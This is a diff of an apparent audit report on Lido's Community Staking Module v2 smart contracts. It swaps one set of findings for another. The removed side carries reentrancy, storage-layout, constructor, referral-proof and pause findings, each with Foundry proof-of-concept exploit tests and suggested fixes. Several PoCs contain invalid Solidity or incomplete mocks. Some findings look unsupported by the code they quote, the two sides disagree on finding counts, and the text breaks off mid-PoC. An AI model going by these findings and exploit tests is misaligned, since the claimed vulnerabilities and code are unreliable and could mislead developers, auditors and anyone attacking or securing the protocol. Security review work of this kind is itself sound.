@@ -3,1450 +3,265 @@
 
 ## Protocol Overview 
 
-### Community Staking Module v2 – High-level Overview
+**Community Staking Module (CSM) v2** brings permissionless, bond-secured node operation to Lido on Ethereum.
 
-Lido’s Community Staking Module (CSM) turns Ethereum solo/home stakers into permissionless Lido node operators by bonding stETH collateral instead of relying on reputation.  The v2 architecture splits duties across specialized, upgradeable contracts:
+• **Join & Bond** – Addresses enter through Permissionless or Vetted *Gates* that create a Node Operator (NO) in `CSModule`. Each NO must lock an stETH-denominated bond in `CSAccounting`; bond size follows flexible curves held in `CSParametersRegistry`.
 
-• **CSModule** – core registry of node operators and validator keys, exposes queue-based key allocation to the StakingRouter and enforces role-gated actions.
+• **Key Management & Queue** – Operators upload validator deposit data to `CSModule`. Keys are placed in FIFO/priority queues; the StakingRouter pulls them for deposits. Keys can be removed for a fee set per curve.
 
-• **CSAccounting** – holds node-operator bonds in stETH shares, manages bonding curves, rewards claims, and burns/locks collateral for penalties.
+• **Rewards & Fees** – Beacon-chain rewards and bond rebases accrue to `CSFeeDistributor`. A HashConsensus-based oracle (`CSFeeOracle`) submits Merkle roots of fee allocations; NOs claim rewards via `CSAccounting` with Merkle proofs. Variable operator fee and treasury rebates are supported.
 
-• **CSFeeOracle + HashConsensus** – oracle committee reaches hash consensus on performance reports; FeeOracle converts reports into Merkle roots for reward & strike distribution.
+• **Performance Enforcement** – `CSStrikes` records oracle-reported under-performance. When strikes exceed a threshold, `CSEjector` triggers validator exits and `CSExitPenalties` levies fines. EL reward theft, delayed exits and triggerable-exit fees are likewise penalised.
 
-• **CSFeeDistributor** – escrow of yet-unclaimed stETH rewards; validates Merkle proofs during operator claims, returns excess fees to treasury.
+• **Withdrawal Proofs** – `CSVerifier` validates EIP-4788 proofs of withdrawals and updates operator stats, burning bond if 32 ETH is not returned.
 
-• **CSStrikes & CSEjector** – track performance strikes; when a validator exceeds the strike threshold, permissionless proofs trigger EIP-7002 exits and apply penalties via CSExitPenalties.
+• **Safety & Governance** – Contracts have pausability (`PausableUntil`), role-based ACL, asset recovery, and upgradability through `OssifiableProxy`; a one-time GateSeal can emergency-pause the entire stack.
 
-• **Gates (Permissionless/Vetted)** – front-door contracts that create node operators, collect initial bond, and optionally run referral programs.
-
-Security is layered with role-based ACL, pausable “GateSeal”, and OssifiableProxy upgradability that can be permanently ossified.  The design guarantees operators can’t over-claim rewards, keys remain bonded, and the DAO can fine or eject misbehaving validators, maintaining Lido’s safety while welcoming community stakers.
-## Critical Risk Findings
-[C-1]. Reentrancy issue found with Critical severity
-[C-2]. Storage Layout issue found with Critical severity
+Together, these components let community stakers securely join Lido, earn rewards, and be automatically policed without central permission.
 ## High Risk Findings
-[H-1]. Upgradeability Initializer Safety issue found with High severity
-[H-2]. Access Control issue found with High severity
-[H-3]. Flash Loan Economic Manipulation issue found with High severity
-[H-4]. DOS issue found with High severity
-[H-5]. Upgradeability Initializer Safety issue found with High severity
-[H-6]. DOS issue found with High severity
-[H-7]. DOS issue found with High severity
+[H-1]. DOS issue found with High severity
 ## Medium Risk Findings
-[M-1]. Reentrancy issue found with Medium severity
-[M-2]. DOS issue found with Medium severity
-[M-3]. DOS issue found with Medium severity
-[M-4]. Upgradeability Initializer Safety issue found with Medium severity
+[M-1]. DOS issue found with Medium severity
+[M-2]. Zero Code issue found with Medium severity
 ## Low Risk Findings
-[L-1]. Zero Code issue in CSStrikes::constructor
-[L-2]. Oracle issue in VettedGate::claimReferrerBondCurve
-[L-3]. Pausable Emergency Stop issue in CSAccounting::pullFeeRewards
-[L-4]. DOS issue in CSExitPenalties::processTriggeredExit
-[L-5]. Zero Code issue in CSExitPenalties::constructor
-[L-6]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize
-## Info Risk Findings
-[I-1]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processTriggeredExit
-[I-2]. Frontrun/Backrun/Sandwhich MEV issue in CSEjector::ejectBadPerformer
+[L-1]. Frontrun/Backrun/Sandwhich MEV issue in CSAccounting::pullFeeRewards
+[L-2]. DOS issue in CSAccounting::addBondCurve
 
 
 ### Number of Findings
-- C: 2
-- H: 7
-- M: 4
-- L: 6
-- I: 2
-
-
-
-# Critical Risk Findings
-
-## [C-1]. Reentrancy issue in CSAccounting::claimRewardsStETH
-
-## Description
-The `CSAccounting.claimRewardsStETH` function is vulnerable to a reentrancy attack that allows a node operator to claim their rewards twice. The function calls `distributor.claim()`, which is an external call to the `CSFeeDistributor` contract. The `CSFeeDistributor.claim()` function in turn calls back to `CSAccounting.onRewardsClaimed()`. This callback function credits the rewards to the node operator's internal balance. After the `distributor.claim()` call returns, the original `claimRewardsStETH` function credits the same rewards to the node operator a second time. This allows the node operator to steal funds from the protocol by withdrawing the doubly-credited rewards.
-
-Vulnerable Code Snippet from `CSAccounting.sol`:
-```solidity
-function claimRewardsStETH(
-    uint256 nodeOperatorId,
-    ICSFeeDistributor.ClaimProof calldata proof
-) external returns (uint256) {
-    if (proof.totalShares == 0) {
-        return 0;
-    }
-
-    uint256 shares = distributor.claim(nodeOperatorId, proof); // (1) External call
-
-    if (shares > 0) {
-        _onRewardsReceived(nodeOperatorId, shares); // (2) Rewards credited again
-    }
-
-    return shares;
-}
-
-function onRewardsClaimed(
-    uint256 nodeOperatorId,
-    uint256 shares,
-    uint256 // totalShares
-) external override {
-    require(msg.sender == address(FEE_DISTRIBUTOR), "FEE_DISTRIBUTOR_ONLY");
-    _onRewardsReceived(nodeOperatorId, shares); // (3) Rewards credited first time inside re-entrant call
-}
-```
-
-
-## Impact
-A malicious node operator can exploit this vulnerability to drain rewards from the `CSFeeDistributor` contract. This theft affects all other honest node operators, as the pool of available rewards is depleted. The stolen funds could be other operators' legitimate rewards or protocol-owned funds, leading to direct financial loss for the Lido protocol and its participants.
-
-## Proof of Concept
-1. A Node Operator (NO) has claimable rewards accumulated in the `CSFeeDistributor` contract.
-2. The NO crafts a valid Merkle proof for their rewards and calls `CSAccounting.claimRewardsStETH()`.
-3. `CSAccounting` calls `CSFeeDistributor.claim()` with the NO's ID and proof.
-4. `CSFeeDistributor` validates the proof and makes a callback to `CSAccounting.onRewardsClaimed()` with the reward amount in shares.
-5. Inside `onRewardsClaimed()`, the NO's internal reward balance (`unclaimedShares`) is increased by the reward amount.
-6. Control returns to `CSFeeDistributor`, which then returns the reward amount to `CSAccounting`.
-7. Back in `claimRewardsStETH()`, the function receives the reward amount and proceeds to call `_onRewardsReceived()` a second time with the same amount.
-8. The NO's `unclaimedShares` balance is now improperly inflated by double the actual reward amount.
-9. The NO can then call `claimBond()` to withdraw their bond, which now includes the doubly-credited rewards, effectively stealing funds.
-
-## Proof of Code
-```solidity
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.24;
-
-import { Test } from "forge-std/Test.sol";
-import { Fixtures } from "../helpers/Fixtures.sol";
-import { ICSFeeDistributor, DistributionData, ClaimProof } from "../../src/interfaces/ICSFeeDistributor.sol";
-import { MerkleTree } from "../helpers/MerkleTree.sol";
-import { console } from "forge-std/console.sol";
-
-contract ReentrancyTest is Test, Fixtures {
-    function setUp() public {
-        _setUp();
-    }
-
-    function test_Reentrancy_DoubleClaimRewards() public {
-        // 1. Setup NO and distribute some fees
-        uint256 nodeOperatorId = _createNodeOperator(NO_MANAGER_1);
-        vm.prank(STAKING_ROUTER);
-        csm.onRewardsMinted(100 ether);
-
-        // 2. Prepare Merkle tree for rewards distribution
-        uint256[] memory noIds = new uint256[](1);
-        noIds[0] = nodeOperatorId;
-        uint256[] memory shares = new uint256[](1);
-        shares[0] = 10 ether;
-        bytes32[] memory leaves = new bytes32[](1);
-        leaves[0] = feeDistributor.hashLeaf(noIds[0], shares[0]);
-
-        MerkleTree.new(leaves);
-        bytes32 root = MerkleTree.getRoot(leaves);
-        bytes32[] memory proof = MerkleTree.getProof(leaves, 0);
-
-        // 3. Oracle reports the new Merkle root
-        vm.prank(FEE_ORACLE);
-        feeDistributor.processOracleReport(root, "", "", 10 ether, 0);
-
-        uint256 balanceBefore = steth.balanceOf(NO_MANAGER_1);
-        uint256 bondSharesBefore = accounting.getBondShares(nodeOperatorId);
-
-        // 4. Malicious NO calls claimRewardsStETH
-        ClaimProof memory claimProof = ClaimProof({totalShares: 10 ether, proof: proof});
-        vm.prank(NO_MANAGER_1);
-        accounting.claimRewardsStETH(nodeOperatorId, claimProof);
-
-        // 5. The reentrancy doubles the credited rewards. NO then claims the excess bond.
-        uint256 bondSharesAfterReward = accounting.getBondShares(nodeOperatorId);
-        uint256 expectedBondSharesAfterReward = bondSharesBefore + (10 ether * 2); // Rewards are doubled
-        assertEq(bondSharesAfterReward, expectedBondSharesAfterReward, "Rewards should be doubled due to reentrancy");
-
-        vm.prank(NO_MANAGER_1);
-        uint256 claimedAmount = accounting.claimBond(nodeOperatorId, type(uint256).max);
-
-        // 6. Verify the NO received double the rewards
-        uint256 balanceAfter = steth.balanceOf(NO_MANAGER_1);
-        uint256 expectedClaimAmount = steth.getSharesByPooledEth(balanceAfter - balanceBefore);
-        // Allow for small precision errors
-        assertApproxEqAbs(claimedAmount, 20 ether, 1e12, "NO should have claimed ~20 ether");
-        assertApproxEqAbs(claimedAmount, expectedClaimAmount, 1e12, "Claimed ETH and shares mismatch");
-    }
-}
-```
-
-## Suggested Mitigation
-To fix this reentrancy vulnerability, the function `claimRewardsStETH` in `CSAccounting.sol` should be modified to prevent the double crediting of rewards. The simplest and most effective solution is to remove the redundant call to `_onRewardsReceived`, as the re-entrant call to `onRewardsClaimed` already handles the reward accounting. Alternatively, a reentrancy guard could be used.
-
-**Recommended Fix:**
-Remove the `_onRewardsReceived` call from `claimRewardsStETH`.
-
-```solidity
-// file: src/CSAccounting.sol
-
-function claimRewardsStETH(
-    uint256 nodeOperatorId,
-    ICSFeeDistributor.ClaimProof calldata proof
-) external returns (uint256) { // removed: nonReentrant
-    if (proof.totalShares == 0) {
-        return 0;
-    }
-
-    uint256 shares = distributor.claim(nodeOperatorId, proof);
-
-    // REMOVE THE FOLLOWING BLOCK:
-    // if (shares > 0) {
-    //     _onRewardsReceived(nodeOperatorId, shares);
-    // }
-
-    return shares;
-}
-```
-This change ensures that `_onRewardsReceived` is called only once per claim, via the `onRewardsClaimed` callback, preventing the double-spend vulnerability.
-
-## [C-2]. Storage Layout issue in CSModule::NA
-
-## Description
-The `CSModule` contract is designed to be upgradeable. In the V2 implementation, a new state variable `_legacyQueue` of type `QueueLib.Queue` is introduced. This variable is not appended to the end of the state variable declarations but is inserted near the top, before other existing state variables like `_nonce` and the `_nodeOperators` mapping.
-
-The `QueueLib.Queue` struct occupies two storage slots. Inserting these two slots into the storage layout of an already deployed contract will shift the storage location of all subsequent variables. When the proxy is upgraded to this new implementation, the contract will read from incorrect storage slots for its state variables, leading to complete state corruption.
-
-For example, if `_nonce` was at slot `S` in V1, after the upgrade, the code will try to read `_nonce` from slot `S+2`, while the actual data for `_nonce` remains at slot `S`. This misalignment will affect all state variables defined after `_legacyQueue`, rendering the contract inoperable and potentially leading to a permanent freeze of all associated assets and bonds.
-
-Vulnerable Code Snippet (showing order of new variables):
-```solidity
-// src/CSModule.sol:95-104
-
-    // ...
-
-    /// @custom:oz-renamed-from keyRemovalCharge
-    /// @custom:oz-retyped-from uint256
-    mapping(uint256 queuePriority => QueueLib.Queue queue)
-        internal _queueByPriority;
-
-    /// @dev Legacy queue (priority=QUEUE_LEGACY_PRIORITY), that should be removed in the future once there are no more batches in it.
-    /// @custom:oz-renamed-from depositQueue
-    QueueLib.Queue internal _legacyQueue; // <-- This new variable shifts storage
-
-    /// @dev Unused. Nullified in the finalizeUpgradeV2
-    /// @custom:oz-renamed-from accounting
-    ICSAccounting internal _accountingOld;
-
-// ... subsequent variables are shifted
-```
-
-## Impact
-Upgrading the contract will lead to complete storage corruption, causing all contract state to become misaligned and nonsensical. This will break all contract functionality, brick the module, and likely result in a permanent loss of control and a freeze of all bonded assets managed by the module. The consequences are catastrophic for the protocol and its users.
-
-## Proof of Concept
-1. Deploy a V1 version of `CSModule` that does not contain the `_legacyQueue` state variable.
-2. Initialize the V1 contract and perform an action that modifies a state variable, for example, calling a function that increments the `_nonce` to 1.
-3. Deploy the V2 `CSModule` implementation (the provided code).
-4. Upgrade the proxy to point to the V2 implementation.
-5. Call `getNonce()` on the proxy. The returned value will not be 1. It will be the value from a different, now misaligned, storage slot, demonstrating the storage corruption.
-
-## Proof of Code
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.24;
-
-import {Test, console} from "forge-std/Test.sol";
-import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
-import {CSModule} from "src/CSModule.sol";
-import {ICSAccounting} from "src/interfaces/ICSAccounting.sol";
-import {ILidoLocator} from "src/interfaces/ILidoLocator.sol";
-import {ICSParametersRegistry} from "src/interfaces/ICSParametersRegistry.sol";
-import {ICSExitPenalties} from "src/interfaces/ICSExitPenalties.sol";
-
-// --- Simplified v1 logic (only the piece we need) ---
-contract CSModuleV1 {
-    uint256 private _nonce;
-
-    function initialize() external {
-        _nonce = 0;
-    }
-
-    function incrementNonce() external {
-        _nonce += 1;
-    }
-
-    function getNonce() external view returns (uint256) {
-        return _nonce;
-    }
-}
-
-// --- Minimal mocks so that CSModule v2 constructor does not revert ---
-contract MockLocator is ILidoLocator {
-    function lido() external pure returns (address) {return address(0x1);}    function stakingRouter() external pure returns (address){return address(0x2);}    function oracle() external pure returns (address){return address(0);}    function treasury() external pure returns (address){return address(0);}    function insuranceFund() external pure returns (address){return address(0);}    function withdrawalQueue() external pure returns (address){return address(0);}    function validatorsExitBusOracle() external pure returns (address){return address(0);}    function depositSecurityModule() external pure returns (address){return address(0);}    function burner() external pure returns (address){return address(0);} }
-
-contract MockParams is ICSParametersRegistry {
-    function QUEUE_LOWEST_PRIORITY() external pure returns (uint256){return 10;}    function QUEUE_LEGACY_PRIORITY() external pure returns (uint256){return 11;}    function getElRewardsStealingAdditionalFine(uint256) external pure returns (uint256){return 0;}    function getAllowedExitDelay(uint256) external pure returns (uint256){return 0;}    function getKeyRemovalCharge(uint256) external pure returns (uint256){return 0;}    function getKeysLimit(uint256) external pure returns (uint256){return 1000;}    function getQueueConfig(uint256) external pure returns (uint32,uint32){return (0,0);} }
-
-contract MockAccounting is ICSAccounting {
-    function feeDistributor() external pure returns (address){return address(0x3);} }
-
-// Fixed version of the mock exit-penalties using fully–qualified names
-contract MockExitPenalties is ICSExitPenalties {
-    function getExitPenaltyInfo(uint256, bytes calldata) external pure returns (ICSExitPenalties.ExitPenaltyInfo memory) {
-        return ICSExitPenalties.ExitPenaltyInfo(
-            ICSExitPenalties.MarkedUint248(false,0),
-            ICSExitPenalties.MarkedUint248(false,0),
-            ICSExitPenalties.MarkedUint248(false,0)
-        );
-    }
-    function isValidatorExitDelayPenaltyApplicable(uint256, bytes calldata, uint256) external pure returns (bool){return false;}
-    function processExitDelayReport(uint256, bytes calldata, uint256) external {}
-    function processStrikesReport(uint256, bytes calldata, uint256, uint256) external {}
-    function processTriggeredExit(uint256, bytes calldata, uint256, uint256) external {}
-}
-
-// ----------------------------------------------------
-contract StorageCorruptionTest is Test {
-    CSModuleV1 v1;
-    CSModule v2;
-    TransparentUpgradeableProxy proxy;
-
-    address admin = address(0xAAA); // proxy admin
-
-    function setUp() public {
-        // deploy v1 and proxy
-        v1 = new CSModuleV1();
-        bytes memory init = abi.encodeWithSelector(v1.initialize.selector);
-        proxy = new TransparentUpgradeableProxy(address(v1), admin, init);
-
-        // interact with v1 via proxy
-        CSModuleV1 proxiedV1 = CSModuleV1(address(proxy));
-        proxiedV1.incrementNonce();
-        assertEq(proxiedV1.getNonce(), 1, "nonce should be 1 on v1");
-
-        // deploy v2 implementation (real contract from repo)
-        v2 = new CSModule(
-            bytes32(0),
-            address(new MockLocator()),
-            address(new MockParams()),
-            address(new MockAccounting()),
-            address(new MockExitPenalties())
-        );
-    }
-
-    function testStorageLayoutCorruption() public {
-        vm.prank(admin);
-        proxy.upgradeTo(address(v2));
-
-        CSModule proxiedV2 = CSModule(address(proxy));
-        uint256 corrupted = proxiedV2.getNonce();
-
-        console.log("nonce after upgrade", corrupted);
-        assertTrue(corrupted != 1, "storage was NOT corrupted – test should fail if fix applied");
-    }
-}
-
-
-## Suggested Mitigation
-To fix this vulnerability, all new state variables in an upgradeable contract must be appended to the end of the existing state variable declarations. The `_legacyQueue` variable should be moved to the end of the `CSModule` contract's state variable list.
-
-```solidity
-contract CSModule is
-    ICSModule,
-    Initializable,
-    // ...
-{
-    // ... existing V1 variables
-
-    uint64 private _totalDepositedValidators;
-    uint64 private _totalExitedValidators;
-    uint64 private _depositableValidatorsCount;
-    uint64 private _nodeOperatorsCount;
-
-    // Start of new V2 variables
-    mapping(uint256 queuePriority => QueueLib.Queue queue)
-        internal _queueByPriority; // This was renamed, so its slot is reused. Correct.
-
-    QueueLib.Queue internal _legacyQueue; // This is new and must be at the end.
-
-    // ...
-}
-```
-Correct approach:
-```solidity
-contract CSModule is
-    ICSModule,
-    Initializable,
-    // ...
-{
-    // ... all variables from V1 in their original order ...
-    uint64 private _nodeOperatorsCount;
-
-    // V2 variables are appended here
-    QueueLib.Queue internal _legacyQueue; 
-
-    // Note: The variable `_queueByPriority` replaces a V1 variable (`keyRemovalCharge`)
-    // and reuses its slot. This is a valid upgrade technique if done carefully.
-    // However, truly new variables like `_legacyQueue` must be appended.
-}
-```
-Follow the OpenZeppelin Upgrades guidelines strictly by always appending new state variables to prevent storage layout corruption.
+- C: 0
+- H: 1
+- M: 2
+- L: 2
+- I: 0
 
 
 
 # Low Risk Findings
 
-## [L-1]. Zero Code issue in CSStrikes::constructor
+## [L-1]. Frontrun/Backrun/Sandwhich MEV issue in CSAccounting::pullFeeRewards
 
 ## Description
-In the constructor of `CSStrikes`, an external call is made to `MODULE.accounting()` to retrieve the address of the `ACCOUNTING` contract. The returned address is then stored in an immutable variable. However, the constructor does not validate that the returned address is non-zero. If the `module` address passed to the constructor is an EOA or a contract that is not yet fully initialized, `MODULE.accounting()` could return `address(0)`. This would set the immutable `ACCOUNTING` variable to `address(0)`, permanently impairing the contract's core functionality. Any subsequent call to `processBadPerformanceProof` will revert when it attempts to use the `ACCOUNTING` address, leading to a permanent Denial of Service.
+The `pullFeeRewards` function is marked as `external` and only performs a check to ensure the node operator exists (`_onlyExistingNodeOperator`). It does not validate that the caller (`msg.sender`) is authorized to act on behalf of the node operator, such as being the manager or reward address. This allows anyone who can obtain a valid `rewardsProof` to trigger a reward pull for any node operator. Rewards proofs, which are part of a Merkle tree distribution, are often made public (e.g., via IPFS, linked by `treeCid` in `CSFeeDistributor`), making them accessible to malicious actors.
 
-## Impact
-If the constructor stores ACCOUNTING as address(0) the CSStrikes instance can never execute _ejectByStrikes, making processBadPerformanceProof permanently unusable. Although no funds can be stolen, the contract that has already been granted roles and referenced by other components of the system becomes irreversibly bricked and must be redeployed, causing operational disruption.
+A malicious actor or MEV searcher can exploit this by monitoring the mempool for transactions that apply a penalty to a node operator. Penalties (e.g., for slashing or other misbehavior) are often calculated as a percentage of the operator's current bond. The attacker can front-run the penalty transaction by calling `pullFeeRewards`, which increases the node operator's bond with their earned rewards. Consequently, the penalty transaction, when executed, will calculate the penalty on a larger bond amount, resulting in a greater financial loss for the node operator.
 
-## Proof of Concept
-1. Deploy a malicious (or un-initialised) module that returns address(0) from accounting().
-2. Deploy CSStrikes with this module address.
-3. Prepare a single KeyStrikes leaf and compute its leaf hash using CSStrikes.hashLeaf.
-4. Have the oracle set treeRoot to this hash via processOracleReport so that the Merkle proof consisting of empty arrays is considered valid.
-5. Call processBadPerformanceProof with msg.value > 0.  Verification succeeds, execution reaches _ejectByStrikes, which tries to call ACCOUNTING.getBondCurveId on address(0) and the transaction reverts.
-6. Any future invocation will keep reverting, proving permanent DoS.
-
-## Proof of Code
-pragma solidity 0.8.24;
-import "forge-std/Test.sol";
-import {CSStrikes, ICSStrikes} from "../src/CSStrikes.sol";
-import {ICSModule} from "../src/interfaces/ICSModule.sol";
-import {ICSAccounting} from "../src/interfaces/ICSAccounting.sol";
-
-contract BadModule is ICSModule {
-    function accounting() external view override returns (ICSAccounting) {
-        return ICSAccounting(address(0));
-    }
-    // minimal stubs
-    function getSigningKeys(uint256, uint256, uint256) external pure override returns (bytes memory) {
-        return bytes("dummy");
-    }
-    function getNodeOperator(uint256) external pure returns (NodeOperator memory) { revert(); }
-    function getNodeOperatorsCount() external pure returns (uint256) { return 0; }
-    function getStakingModuleSummary() external pure returns (uint256,uint256,uint256) { revert(); }
-}
-
-contract ZeroAccountingConstructorTest is Test {
-    CSStrikes strikes;
-
-    function setUp() public {
-        BadModule bad = new BadModule();
-        strikes = new CSStrikes(address(bad), address(this), address(this), address(this));
-
-        // craft a leaf that will pass verification
-        CSStrikes.KeyStrikes memory ks;
-        ks.nodeOperatorId = 1;
-        ks.keyIndex = 0;
-        ks.data = new uint256[](1);
-        ks.data[0] = 1;
-        bytes memory pubkey = bad.getSigningKeys(1,0,1);
-        bytes32 leaf = strikes.hashLeaf(ks, pubkey);
-
-        // act as oracle to set root == leaf so empty proof passes
-        strikes.processOracleReport(leaf, "cid");
-    }
-
-    function test_DoS_due_to_zeroAccounting() public {
-        CSStrikes.KeyStrikes[] memory list = new CSStrikes.KeyStrikes[](1);
-        list[0] = CSStrikes.KeyStrikes({nodeOperatorId:1,keyIndex:0,data:new uint256[](1)});
-        list[0].data[0] = 1;
-
-        bytes32[] memory proof = new bytes32[](0);
-        bool[] memory flags = new bool[](0);
-
-        vm.expectRevert();
-        strikes.processBadPerformanceProof{value: 1 ether}(list, proof, flags, address(this));
-    }
-}
-
-## Suggested Mitigation
-In the constructor check that address(MODULE.accounting()) != address(0) and revert (e.g., with a custom error ZeroAccountingAddress()). This guarantees a valid ACCOUNTING pointer is stored and prevents an unusable deployment.
-
-## [L-2]. Oracle issue in VettedGate::claimReferrerBondCurve
-
-## Description
-The `claimReferrerBondCurve` function allows a node operator who has successfully referred others to claim a beneficial bond curve. To do so, they must prove they are on the vetted list using a Merkle proof. The function validates this proof against the current `treeRoot`. However, referrals are associated with a specific `referralProgramSeasonNumber`. If the Merkle tree is updated by the `SET_TREE_ROLE` holder after a user has accumulated enough referrals but before they have claimed their reward, they might be removed from the new tree. This would cause their `claimReferrerBondCurve` transaction to fail, as their proof would be invalid against the new `treeRoot`. The contract does not store historical tree roots or link referral seasons to specific tree versions, leading to a scenario where legitimate referrers can lose their earned rewards.
-
+Vulnerable Code Snippet:
 ```solidity
-// VettedGate.sol:346-353
-function claimReferrerBondCurve(
-    uint256 nodeOperatorId,
-    bytes32[] calldata proof
-) external whenResumed {
-    _onlyNodeOperatorOwner(nodeOperatorId);
-
-    // @dev Only members from the current merkle tree can claim the referral bond curve
-    if (!verifyProof(msg.sender, proof)) { // This uses the current `treeRoot`
-        revert InvalidProof();
-    }
-//...
-}
-```
-
-## Impact
-A referrer who legitimately earned the right to a beneficial bond curve can be prevented from claiming it due to an administrative update of the vetted list (Merkle tree). This creates a trust issue and undermines the referral program's incentive structure, as rewards are not guaranteed even when the conditions are met. This could disincentivize participation in the referral program and lead to loss of earned rewards for users.
-
-## Proof of Concept
-1. A referral season `S` starts with `treeRoot` `T1`.
-2. Alice is on the vetted list corresponding to `T1`.
-3. Alice refers enough new node operators during season `S` to meet the `referralsThreshold`.
-4. Before Alice can claim her reward, the `SET_TREE_ROLE` holder updates the vetted list, setting a new `treeRoot` `T2`. Alice is not on the new list `T2`.
-5. Alice attempts to call `claimReferrerBondCurve`, providing her valid proof for tree `T1`.
-6. The `verifyProof` check inside the function fails because it validates the proof against the current `treeRoot` (from `T2`), not `T1`.
-7. Alice is unfairly blocked from claiming her earned reward.
-
-## Proof of Code
-```solidity
-// test/VettedGate.t.sol
-// This test demonstrates that a valid referrer can be blocked from claiming rewards if the Merkle tree changes.
-
-// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
-// SPDX-License-Identifier: GPL-3.0
-pragma solidity 0.8.24;
-
-import { VettedGateTest } from "./VettedGate.t.sol";
-import { NodeOperatorManagementProperties } from "../../src/interfaces/ICSModule.sol";
-import { MerkleTree } from "../helpers/MerkleTree.sol";
-import { IVettedGate } from "../../src/interfaces/IVettedGate.sol";
-
-contract PocOrphanedRewardsTest is VettedGateTest {
-    function test_PoC_CannotClaimAfterTreeUpdate() public {
-        // 1. SETUP: Create Tree 1 with 'alice' as a member.
-        address alice = makeAddr("alice");
-        address charlie = makeAddr("charlie"); // User who will join
-        address[] memory membersT1 = new address[](2);
-        membersT1[0] = alice;
-        membersT1[1] = charlie;
-        MerkleTree memory tree1 = new MerkleTree(membersT1);
-
-        // 2. CONFIGURE: Set Tree 1 and start referral season 1 with a threshold of 1.
-        vm.prank(csmCommittee);
-        vettedGate.setTreeParams(tree1.getRoot(), "cid1");
-        vm.prank(csmCommittee);
-        vettedGate.startNewReferralProgramSeason(REFERRAL_CURVE_ID, 1);
-
-        // 3. ACTION: 'charlie' joins and refers 'alice'. Alice now meets the threshold.
-        bytes32[] memory charlieProof = tree1.getProof(charlie);
-        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
-            managerAddress: charlie,
-            rewardAddress: charlie
-        });
-        vm.prank(charlie);
-        vm.deal(charlie, 1 ether);
-        uint256 noIdForCharlie = vettedGate.addNodeOperatorETH{value: 1 ether}(
-            1, bytes(""), bytes(""), props, charlieProof, alice
-        );
-        assertEq(vettedGate.getReferralsCount(alice, vettedGate.referralProgramSeasonNumber()), 1);
-
-        // Assume Alice has a node operator ID from a previous action.
-        uint256 noIdForAlice = 0; // For simplicity.
-
-        // 4. ADMIN ACTION: Update Merkle tree to Tree 2, which does NOT include 'alice'.
-        address[] memory membersT2 = new address[](1);
-        membersT2[0] = makeAddr("dave");
-        MerkleTree memory tree2 = new MerkleTree(membersT2);
-        vm.prank(csmCommittee);
-        vettedGate.setTreeParams(tree2.getRoot(), "cid2");
-
-        // 5. EXPLOIT: Alice tries to claim her referral reward using her proof from Tree 1.
-        bytes32[] memory proofForT1 = tree1.getProof(alice);
-        vm.prank(alice);
-        
-        // The call must revert because her proof is for rootT1, but the contract's current root is rootT2.
-        vm.expectRevert(IVettedGate.InvalidProof.selector);
-        vettedGate.claimReferrerBondCurve(noIdForAlice, proofForT1);
-    }
-}
-```
-
-## Suggested Mitigation
-The contract should associate each referral season with the Merkle tree root that was active when it started. When a user claims a referral reward, the proof should be validated against the historical root of the relevant season, not the current one. This can be implemented by storing the `treeRoot` for each season.
-
-```solidity
-// Suggested change in VettedGate.sol
-
-// Add a new state variable to track tree roots per season
-mapping(uint256 => bytes32) private _seasonToTreeRoot;
-
-// In startNewReferralProgramSeason()
-function startNewReferralProgramSeason(
-    uint256 _referralCurveId,
-    uint256 _referralsThreshold
-) external onlyRole(START_REFERRAL_SEASON_ROLE) returns (uint256 season) {
-    if (isReferralProgramSeasonActive) {
-        revert ReferralProgramIsActive();
-    }
-    // ... other checks
-
-    referralCurveId = _referralCurveId;
-    referralsThreshold = _referralsThreshold;
-    isReferralProgramSeasonActive = true;
-
-    season = referralProgramSeasonNumber + 1;
-    referralProgramSeasonNumber = season;
-
-    // Store the current tree root for the new season
-    _seasonToTreeRoot[season] = treeRoot;
-
-    emit ReferralProgramSeasonStarted(
-        season,
-        _referralCurveId,
-        _referralsThreshold
-    );
-}
-
-// In claimReferrerBondCurve()
-function claimReferrerBondCurve(
-    uint256 nodeOperatorId,
-    bytes32[] calldata proof
-) external whenResumed {
-    _onlyNodeOperatorOwner(nodeOperatorId);
-
-    if (!isReferralProgramSeasonActive) {
-        revert ReferralProgramIsNotActive();
-    }
-
-    uint256 season = referralProgramSeasonNumber;
-    bytes32 historicalRoot = _seasonToTreeRoot[season];
-
-    // Verify proof against the historical root for that season
-    if (historicalRoot == bytes32(0) || !MerkleProof.verifyCalldata(proof, historicalRoot, hashLeaf(msg.sender))) {
-        revert InvalidProof();
-    }
-
-    // ... rest of the function ...
-}
-```
-
-## [L-3]. Pausable Emergency Stop issue in CSAccounting::pullFeeRewards
-
-## Description
-The `pullFeeRewards` function, which allows triggering the distribution of fee rewards to a Node Operator's bond, is missing the `whenResumed` modifier. In contrast, all other external functions in `CSAccounting` that cause state changes (`deposit*`, `claimRewards*`) are pausable. This inconsistency allows `pullFeeRewards` to be called even when the system is in an emergency paused state, which could lead to unintended state changes that undermine the purpose of the pause (e.g., if reward calculations are found to be faulty and the pause is intended to prevent their distribution).
-
-## Impact
-While the contract is paused, external actors are supposed to be blocked from changing critical state. Because pullFeeRewards() lacks the whenResumed modifier, anyone can still move already-distributed reward shares from CSFeeDistributor into the Node Operator’s bond during the pause. This undermines the pause’s purpose (e.g., while a calculation bug is investigated) but does NOT allow theft of protocol funds, permanent loss, or denial-of-service. It merely allows accounting changes that may later have to be rolled back by governance.
-
-## Proof of Concept
-1. Deploy CSAccounting behind an OssifiableProxy (or reuse an existing deployment).
-2. Give an EOA the PAUSE_ROLE and call pauseFor(1 days).
-3. Using the same or another EOA, call depositETH(0) ⇒ tx reverts with ResumedExpected().
-4. In the same paused state call pullFeeRewards(0, 0, new bytes32[](0)). The call is executed (it reverts with NodeOperatorDoesNotExist or with a FeeDistributor error, but NOT with ResumedExpected()). This proves the function ignores the paused state.
-5. If a valid nodeOperatorId and proof are supplied, the bond balance would increase even though the module is paused.
-
-## Proof of Code
-```solidity
-// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
-// SPDX-License-Identifier: GPL-3.0
-pragma solidity 0.8.24;
-
-import { Test, Vm } from "forge-std/Test.sol";
-import { CSAccounting } from "../../src/CSAccounting.sol";
-// ... imports for mocks ...
-
